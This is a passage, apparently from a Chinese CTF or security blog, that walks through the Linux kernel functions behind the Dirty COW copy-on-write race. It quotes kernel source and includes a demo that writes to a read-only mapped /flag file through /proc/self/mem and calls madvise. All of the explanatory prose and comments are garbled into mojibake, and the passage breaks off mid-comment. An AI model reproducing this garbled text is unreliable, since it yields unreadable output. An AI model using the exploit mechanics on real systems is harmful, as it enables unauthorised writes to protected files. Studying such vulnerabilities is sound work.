mem_cgroup_commit_charge(page, memcg, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>		lru_cache_add_active_or_unevictable(page, vma);<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		inc_mm_counter_fast(vma-&gt;vm_mm, mm_counter_file(page));<br>		page_add_file_rmap(page, <span class="hljs-literal">false</span>);<br>	&#125;<br>    <span class="hljs-comment">//Âú®È°µË°®‰∏≠ËÆæÁΩÆPTE</span><br>	set_pte_at(vma-&gt;vm_mm, fe-&gt;address, fe-&gt;pte, entry);<br><br>	<span class="hljs-comment">/* no need to invalidate: a not-present page won&#x27;t be cached */</span><br>    <span class="hljs-comment">//Êõ¥Êñ∞MMUÁºìÂ≠ò</span><br>	update_mmu_cache(vma, fe-&gt;address, fe-&gt;pte);<br><br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<ul>
<li><ul>
<li></li>
</ul>
</li>
</ul>
<p>Ë∞ÉÁî®ÈìæÂ¶Ç‰∏ã</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs SCSS"><span class="hljs-built_in">faultin_page</span>()<br>	<span class="hljs-built_in">handle_mm_fault</span>()<br>		<span class="hljs-built_in">__handle_mm_fault</span>()<br>			<span class="hljs-built_in">handle_pte_fault</span>()<br>				<span class="hljs-built_in">do_fault</span>()<br>					<span class="hljs-built_in">do_cow_fault</span>()<br>						<span class="hljs-built_in">alloc_set_pte</span>()<br>							<span class="hljs-built_in">maybe_mkwrite</span>()<br>								<span class="hljs-built_in">pte_mkdirty</span>()<br>			<br></code></pre></td></tr></table></figure>

<h4 id="get-user-pages„ÅÆÁ¨¨‰∫åÊ¨°Âæ™ÁéØ"><a href="#get-user-pages„ÅÆÁ¨¨‰∫åÊ¨°Âæ™ÁéØ" class="headerlink" title="__get_user_pages„ÅÆÁ¨¨‰∫åÊ¨°Âæ™ÁéØ"></a>__get_user_pages„ÅÆÁ¨¨‰∫åÊ¨°Âæ™ÁéØ</h4><p>ÂàÜÈÖçÂà∞<code>COW</code>È°µ‰πãÂêéÂõûÂà∞<code>retry</code>ÔºåÁ¨¨‰∫åÊ¨°ËøõÂÖ•<code>follow_page_mask()</code>ÔºåËøôÊ¨°‰∏ÄÂàáÊ≠£Â∏∏ÔºåËøõÂÖ•<code>follow_page_pte()</code></p>
<p>butÁî±‰∫é<code>PTE</code>‰∏çÂèØÂÜôÂÖ•, ‰∏î<code>flags</code>‰∏≠ËÆæÁΩÆ‰∫Ü<strong>FOLL_WRITE</strong>Ê†áÂøó, Âõ†Ê≠§‰ºöÂÜçÊ¨°Â§±Ë¥•Ôºå<code>follow_page_mask()</code>ËøîÂõûÂÄº‰∏∫<strong>NULL</strong>ÔºåÁªßÁª≠ËøõÂÖ•<code>faultin_page</code>Â§ÑÁêÜÁº∫È°µÂºÇÂ∏∏</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte)) &#123;<span class="hljs-comment">//Â¶ÇÊûúË¶ÅÊ±ÇÂÜôÂÖ•Ôºå‰ΩÜÊòØpteË°®Á§∫‰∏çÂèØÂÜôÂÖ•</span><br>		pte_unmap_unlock(ptep, ptl);<br>		<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>	&#125;<br></code></pre></td></tr></table></figure>

<p>Áî±‰∫éË¶ÅËøõË°åÂÜôÂÖ•Êìç‰Ωú, Âπ∂‰∏îÂØπÂ∫îÈ°µÂ≠òÂú®, Âõ†Ê≠§<code>handle_pte_fault()</code>‰ºöË∞ÉÁî®<code>do_wp_page()</code>ËøõË°åÂÜôÊó∂Â§çÂà∂</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> (fe-&gt;flags &amp; FAULT_FLAG_WRITE) &#123;<span class="hljs-comment">//Â≠òÂú® FAULT_FLAG_WRITE Ê†áÂøó‰ΩçÔºåË°®Á§∫Áº∫È°µÂºÇÂ∏∏Áî±ÂÜôÊìç‰ΩúÂºïËµ∑</span><br>		<span class="hljs-keyword">if</span> (!pte_write(entry))<span class="hljs-comment">//ÂØπÂ∫îÁöÑÈ°µ‰∏çÂèØÂÜô</span><br>			<span class="hljs-keyword">return</span> do_wp_page(fe, entry);<span class="hljs-comment">//ËøõË°åÂÜôÊó∂Â§çÂà∂ÔºåÂ∞ÜÂÜÖÂÆπÂÜôÂÖ•Áî± do_fault()-&gt;do_cow_fault()ÂàÜÈÖçÁöÑÂÜÖÂ≠òÈ°µ‰∏≠</span><br></code></pre></td></tr></table></figure>

<p><code>do_wp_page()</code>ÊµÅÁ®ãÂ¶Ç‰∏ã</p>
<ul>
<li><ul>
<li>Ë∞ÉÁî®<code>vm_normal_page()</code> Ê†πÊçÆ<code>address</code>ÊâæÂà∞ÂØπÂ∫îÁöÑÈ°µÊèèËø∞Á¨¶</li>
<li>Â¶ÇÊûúÂèëÁé∞ÊòØÂåøÂêçÈ°µ, Âπ∂‰∏îÊ≠§È°µÂè™Êúâ‰∏Ä‰∏™ÂºïÁî®, ÈÇ£‰πà‰ºöË∞ÉÁî®<code>wp_page_reuse()</code>Áõ¥Êé•ÈáçÁî®Ëøô‰∏™È°µ.</li>
<li>Á¨¨‰∏ÄÊ¨°<code>faultin_page()</code>Êó∂ËøõÂÖ•<code>do_cow_fault()</code>, Â∞±Â∑≤Áªè‰∏ìÈó®Â§çÂà∂‰∫Ü‰∏ÄÈ°µ, Âõ†Ê≠§‰ºöÁõ¥Êé•ËøõÂÖ•<code>wp_page_reuse()</code> ÈáçÁî®Ëøô‰∏™È°µ</li>
</ul>
</li>
<li></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//ËÉΩÂê¶ÈáçÁî®‰∏Ä‰∏™È°µ</span><br><span class="hljs-keyword">if</span> (reuse_swap_page(old_page, &amp;total_mapcount)) &#123;<br>    		<span class="hljs-comment">//Â¶ÇÊûúËøô‰∏™ÂåøÂêçÈ°µÂè™Êúâ‰∏Ä‰∏™Êò†Â∞ÑÔºåÈÇ£‰πà‰∏çÁî®ÈáçÊñ∞ÂàÜÈÖçÈ°µÔºåÁõ¥Êé•ÊääÊóßÈ°µÊãøÂéªÂÜô</span><br>			<span class="hljs-keyword">if</span> (total_mapcount == <span class="hljs-number">1</span>) &#123;<br>				<span class="hljs-comment">/*</span><br><span class="hljs-comment">				 * The page is all ours. Move it to</span><br><span class="hljs-comment">				 * our anon_vma so the rmap code will</span><br><span class="hljs-comment">				 * not search our parent or siblings.</span><br><span class="hljs-comment">				 * Protected against the rmap code by</span><br><span class="hljs-comment">				 * the page lock.</span><br><span class="hljs-comment">				 */</span><br>                <span class="hljs-comment">//ÊääÊóß‰∏öÊîæÂà∞anon_vma‰∏≠ÔºåËøô‰∏™Ê∂âÂèäÂà∞ÂèçÂêëÊò†Â∞Ñ</span><br>				page_move_anon_rmap(old_page, vma);<br>			&#125;<br>			unlock_page(old_page);<br>    		<span class="hljs-comment">//ÊóßÈ°µÂè™Â±û‰∫éËøô‰∏™ËøõÁ®ãÔºåÂ∞ùËØïÁªôPTEÂä†‰∏äÂèØÂÜôÂÖ•Ê†áÂøó</span><br>			<span class="hljs-keyword">return</span> wp_page_reuse(fe, orig_pte, old_page, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>		&#125;<br></code></pre></td></tr></table></figure>

<p><code>wp_page_reuse()</code>‰∏ªË¶ÅÂ∞±ÊòØËÆæÁΩÆ<strong>PTE</strong>, ÁÑ∂ÂêéËøîÂõû<strong>VM_FAULT_WRITE</strong></p>
<ul>
<li><ul>
<li>Ê≥®ÊÑèÁî±‰∫éËøôÁâá<strong>VMA</strong>‰∏çÂèØÂÜôÂÖ•,Âõ†Ê≠§<strong>PTE</strong>‰ªªÁÑ∂Ê≤°Êúâ<strong>RW</strong>Ê†áÂøó,</li>
</ul>
</li>
<li></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">wp_page_reuse</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fault_env *fe, <span class="hljs-type">pte_t</span> orig_pte,</span><br><span class="hljs-params">			<span class="hljs-keyword">struct</span> page *page, <span class="hljs-type">int</span> page_mkwrite, <span class="hljs-type">int</span> dirty_shared)</span><br>	__<span class="hljs-title function_">releases</span><span class="hljs-params">(fe-&gt;ptl)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> fe-&gt;vma;<br>	<span class="hljs-type">pte_t</span> entry;<br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * Clear the pages cpupid information as the existing</span><br><span class="hljs-comment">	 * information potentially belongs to a now completely</span><br><span class="hljs-comment">	 * unrelated process.</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">if</span> (page)<br>		page_cpupid_xchg_last(page, (<span class="hljs-number">1</span> &lt;&lt; LAST_CPUPID_SHIFT) - <span class="hljs-number">1</span>);<br><br>	flush_cache_page(vma, fe-&gt;address, pte_pfn(orig_pte));<br>	entry = pte_mkyoung(orig_pte);									<span class="hljs-comment">//Ê†áËÆ∞‰∏ãÂàöÂàöËÆøÈóÆËøá</span><br>	entry = maybe_mkwrite(pte_mkdirty(entry), vma);					  <span class="hljs-comment">//ËÆæÁΩÆËÑè‰ΩçÔºåÂ¶ÇÊûúVMAÂèØÂÜôÁöÑËØùËÆæÁΩÆÂÜôÂÖ•‰Ωç</span><br>	<span class="hljs-keyword">if</span> (ptep_set_access_flags(vma, fe-&gt;address, fe-&gt;pte, entry, <span class="hljs-number">1</span>))	   <span class="hljs-comment">//ÂÜôÂÖ•PTE</span><br>		update_mmu_cache(vma, fe-&gt;address, fe-&gt;pte);				 <span class="hljs-comment">//Êõ¥Êñ∞mmuÁºìÂ≠ò</span><br>	pte_unmap_unlock(fe-&gt;pte, fe-&gt;ptl);<br><br>	<span class="hljs-keyword">if</span> (dirty_shared) &#123;<br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">address_space</span> *<span class="hljs-title">mapping</span>;</span><br>		<span class="hljs-type">int</span> dirtied;<br><br>		<span class="hljs-keyword">if</span> (!page_mkwrite)<br>			lock_page(page);<br><br>		dirtied = set_page_dirty(page);<br>		VM_BUG_ON_PAGE(PageAnon(page), page);<br>		mapping = page-&gt;mapping;<br>		unlock_page(page);<br>		put_page(page);<br><br>		<span class="hljs-keyword">if</span> ((dirtied || page_mkwrite) &amp;&amp; mapping) &#123;<br>			<span class="hljs-comment">/*</span><br><span class="hljs-comment">			 * Some device drivers do not set page.mapping</span><br><span class="hljs-comment">			 * but still dirty their pages</span><br><span class="hljs-comment">			 */</span><br>			balance_dirty_pages_ratelimited(mapping);<br>		&#125;<br><br>		<span class="hljs-keyword">if</span> (!page_mkwrite)<br>			file_update_time(vma-&gt;vm_file);<br>	&#125;<br>    <span class="hljs-keyword">return</span> VM_FAULT_WRITE; <span class="hljs-comment">//ËøîÂõûËøô‰∏™Ê†áÂøóË°®Á§∫ËøõË°åCOW‰πãÂêéÔºåËøô‰∏™È°µÂèØ‰ª•ÂÜôÂÖ•‰∫Ü</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>ÊúÄÂêé<code>handle_mm_fault()</code>ËøîÂõûÂà∞<code>faultin_page()</code>‰∏≠Êó∂, Áî±‰∫éËøîÂõû‰∫Ü<strong>VM_FAULT_WRIT</strong>EÊ†áÂøó, Ë°®Á§∫ÂèØ‰ª•ÂÜôÂÖ•, Âõ†Ê≠§‰ºöÂéªÊéâ<code>flags</code>‰∏≠ÁöÑ<strong>FOLL_WRITE</strong>Ê†áÂøó, ‰∏çÂÜçÊ£ÄÊü•ÂÜôÂÖ•ÊùÉÈôê</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))<br>		*flags &amp;= ~FOLL_WRITE;<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure>

<p>Ë∞ÉÁî®ÈìæÂ¶Ç‰∏ã</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs SCSS"><span class="hljs-built_in">faultin_page</span>()<br>	<span class="hljs-built_in">handle_mm_fault</span>()<br>		<span class="hljs-built_in">__handle_mm_fault</span>()<br>			<span class="hljs-built_in">handle_pte_fault</span>()<br>				<span class="hljs-built_in">do_fault</span>()<br>					<span class="hljs-built_in">do_wp_page</span>()<br>						<span class="hljs-built_in">wp_page_reuse</span>()<br>							<span class="hljs-built_in">maybe_mkwrite</span>(pte_mkdirty(entry), vma);<br>                        	  return VM_FAULT_WRITE;<br></code></pre></td></tr></table></figure>

<h4 id="get-user-pages„ÅÆÁ¨¨‰∏âÊ¨°Âæ™ÁéØ"><a href="#get-user-pages„ÅÆÁ¨¨‰∏âÊ¨°Âæ™ÁéØ" class="headerlink" title="__get_user_pages„ÅÆÁ¨¨‰∏âÊ¨°Âæ™ÁéØ"></a>__get_user_pages„ÅÆÁ¨¨‰∏âÊ¨°Âæ™ÁéØ</h4><p>Á¨¨‰∏âÊ¨°ËøõÂÖ•<code>follow_page_mask()</code>, Áî±‰∫é‰πãÂâçÂéªÊéâ‰∫Ü<strong>FOLL_WRITE</strong>Ê†áÂøó, Âõ†Ê≠§‰∏ç‰ºöÊ£ÄÊü•<strong>PTE</strong>ÊúâÊ≤°ÊúâÂÜôÂÖ•ÊùÉÈôê, ‰ªéËÄåÈÄöËøá<code>follow_page_mask()</code>ËøîÂõûÂØπÂ∫îÁöÑÈ°µ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte)) &#123;<span class="hljs-comment">//Â¶ÇÊûúË¶ÅÊ±ÇÂÜôÂÖ•Ôºå‰ΩÜÊòØpteË°®Á§∫‰∏çÂèØÂÜôÂÖ•</span><br>		pte_unmap_unlock(ptep, ptl);<br>		<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>	&#125;<br><br></code></pre></td></tr></table></figure>

<ul>
<li>‰πãÂêé‰ºöÊ≤øÁùÄË∑ØÂæÑËøîÂõû: <code>get_user_pages() -&gt;__ get_user_pages_locked() -&gt; get_user_page_remote() -&gt; __access_remote_vm()</code></li>
<li><code>__access_remote_vm()</code>ÈîÅÂÆöÈ°µÈù¢Âêé, ÂÖàË∞ÉÁî®<code>kmap</code>ÊääÈ°µÈù¢Êò†Â∞ÑÂà∞ÂÜÖÊ†∏Âú∞ÂùÄÁ©∫Èó¥‰∏≠, ÂÜçË∞ÉÁî®<code>copy_to_user_page()</code>ÂÆåÊàê‰ªéÂÜÖÊ†∏ÁºìÂÜ≤Âå∫Âà∞ÂØπÂ∫îÈ°µÈù¢ÁöÑÂÜôÂÖ•</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//Ê≠§Êó∂ÁöÑpage‰∏∫get_user_pages_remote()‰∏∫Áî®Êà∑ÂØªÊâæÁöÑÔºåÊòØË¢´ÈîÅÂÆöÂú®ÂÜÖÂ≠ò‰∏≠ÁöÑÈ°µÔºåkmapÂ∞ÜÂÖ∂Êò†Â∞ÑÂú®ÂÜÖÊ†∏Âú∞ÂùÄÁ©∫Èó¥‰∏≠</span><br>			maddr = kmap(page);<br>			<span class="hljs-keyword">if</span> (write) &#123;	<span class="hljs-comment">//ÂÜôÂÖ•ËØ∑Ê±Ç</span><br>                <span class="hljs-comment">/*</span><br><span class="hljs-comment">                	ÂÖàË∞ÉÁî®copy_to_user_page()ËøõË°åÂÜôÂÖ•</span><br><span class="hljs-comment">                	maddr‰∏∫Ê†πÊçÆaddrÈîÅÂÆöÁöÑÈ°µÔºåoffset‰∏∫addrÈ¢ùÈ°µÂÜÖÂÅèÁßªÔºå‰∏§ËÄÖÁõ∏Âä†Â∞±ÊòØË¶ÅÂÜôÂÖ•ÁöÑÂú∞ÂùÄ</span><br><span class="hljs-comment">                	Á≠â‰ª∑‰∏∫Ôºömemcpy(maddr + offset, buf, bytes)</span><br><span class="hljs-comment">                */</span><br>				copy_to_user_page(vma, page, addr,<br>						  maddr + offset, buf, bytes);<br></code></pre></td></tr></table></figure>



<h2 id="madvise„ÅÆ‰ΩøÁî®ÊñπÊ≥ï"><a href="#madvise„ÅÆ‰ΩøÁî®ÊñπÊ≥ï" class="headerlink" title="madvise„ÅÆ‰ΩøÁî®ÊñπÊ≥ï"></a>madvise„ÅÆ‰ΩøÁî®ÊñπÊ≥ï</h2><p><code>madvise()</code>Á≥ªÁªüÊéâÁî®ÔºåÁî®‰∫éÂêëÂÜÖÊ†∏Êèê‰æõÂØπ‰∫éËµ∑ÂßãÂú∞ÂùÄ‰∏∫<code>addr</code>ÔºåÈïøÂ∫¶‰∏∫<code>length</code>ÁöÑÂÜÖÂ≠òÁ©∫Èó¥ÁöÑÊìç‰ΩúÂª∫ËÆÆÊàñËÄÖÊåáÁ§∫„ÄÇÂú®Â§ßÂ§öÊï∞ÊÉÖÂÜµ‰∏ãÔºåÊ≠§Á±ªÂª∫ËÆÆÁöÑÁõÆÊ†áÊòØÊèêÈ´òÁ≥ªÁªüÊàñËÄÖÂ∫îÁî®Á®ãÂ∫èÁöÑÊÄßËÉΩ„ÄÇ</p>
<h4 id="ÊµãËØïdemo-1"><a href="#ÊµãËØïdemo-1" class="headerlink" title="ÊµãËØïdemo"></a>ÊµãËØïdemo</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-type">int</span> fd;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br><span class="hljs-type">void</span> *mem;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">processMem</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> f = open(<span class="hljs-string">&quot;/proc/self/mem&quot;</span>, O_RDWR);<br>    lseek(f, mem, SEEK_SET);<br>    write(f, <span class="hljs-string">&quot;AAA&quot;</span>, <span class="hljs-number">3</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, (<span class="hljs-type">char</span> *)mem);<br><br>    madvise(mem, <span class="hljs-number">0x100</span>, MADV_DONTNEED);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    fd = open(<span class="hljs-string">&quot;/flag&quot;</span>, O_RDONLY);<br>    fstat(fd, &amp;st);<br>    mem = mmap(<span class="hljs-literal">NULL</span>, st.st_size, PROT_READ, MAP_PRIVATE, fd, <span class="hljs-number">0</span>);<br><br>    processMem();<br>&#125;<br><br></code></pre></td></tr></table></figure>

<h4 id="sys-madvise"><a href="#sys-madvise" class="headerlink" title="sys_madvise()"></a>sys_madvise()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The madvise(2) system call.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Applications can use madvise() to advise the kernel how it should</span><br><span class="hljs-comment"> * handle paging I/O in this VM area.  The idea is to help the kernel</span><br><span class="hljs-comment"> * use appropriate read-ahead and caching techniques.  The information</span><br><span class="hljs-comment"> * provided is advisory only, and can be safely disregarded by the</span><br><span class="hljs-comment"> * kernel without affecting the correct operation of the application.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * behavior values:</span><br><span class="hljs-comment"> *  MADV_NORMAL - the default behavior is to read clusters.  This</span><br><span class="hljs-comment"> *		results in some read-ahead and read-behind.</span><br><span class="hljs-comment"> *  MADV_RANDOM - the system should read the minimum amount of data</span><br><span class="hljs-comment"> *		on any access, since it is unlikely that the appli-</span><br><span class="hljs-comment"> *		cation will need more than what it asks for.</span><br><span class="hljs-comment"> *  MADV_SEQUENTIAL - pages in the given range will probably be accessed</span><br><span class="hljs-comment"> *		once, so they can be aggressively read ahead, and</span><br><span class="hljs-comment"> *		can be freed soon after they are accessed.</span><br><span class="hljs-comment"> *  MADV_WILLNEED - the application is notifying the system to read</span><br><span class="hljs-comment"> *		some pages ahead.</span><br><span class="hljs-comment"> *  MADV_DONTNEED - the application is finished with the given range,</span><br><span class="hljs-comment"> *		so the kernel can free resources associated with it.</span><br><span class="hljs-comment"> *  MADV_FREE - the application marks pages in the given range as lazy free,</span><br><span class="hljs-comment"> *		where actual purges are postponed until memory pressure happens.</span><br><span class="hljs-comment"> *  MADV_REMOVE - the application wants to free up the given range of</span><br><span class="hljs-comment"> *		pages and associated backing store.</span><br><span class="hljs-comment"> *  MADV_DONTFORK - omit this area from child&#x27;s address space when forking:</span><br><span class="hljs-comment"> *		typically, to avoid COWing pages pinned by get_user_pages().</span><br><span class="hljs-comment"> *  MADV_DOFORK - cancel MADV_DONTFORK: no longer omit this area when forking.</span><br><span class="hljs-comment"> *  MADV_HWPOISON - trigger memory error handler as if the given memory range</span><br><span class="hljs-comment"> *		were corrupted by unrecoverable hardware memory failure.</span><br><span class="hljs-comment"> *  MADV_SOFT_OFFLINE - try to soft-offline the given range of memory.</span><br><span class="hljs-comment"> *  MADV_MERGEABLE - the application recommends that KSM try to merge pages in</span><br><span class="hljs-comment"> *		this area with pages of identical content from other such areas.</span><br><span class="hljs-comment"> *  MADV_UNMERGEABLE- cancel MADV_MERGEABLE: no longer merge pages with others.</span><br><span class="hljs-comment"> *  MADV_HUGEPAGE - the application wants to back the given range by transparent</span><br><span class="hljs-comment"> *		huge pages in the future. Existing pages might be coalesced and</span><br><span class="hljs-comment"> *		new pages might be allocated as THP.</span><br><span class="hljs-comment"> *  MADV_NOHUGEPAGE - mark the given range as not worth being backed by</span><br><span class="hljs-comment"> *		transparent huge pages so the existing pages will not be</span><br><span class="hljs-comment"> *		coalesced into THP and new pages will not be allocated as 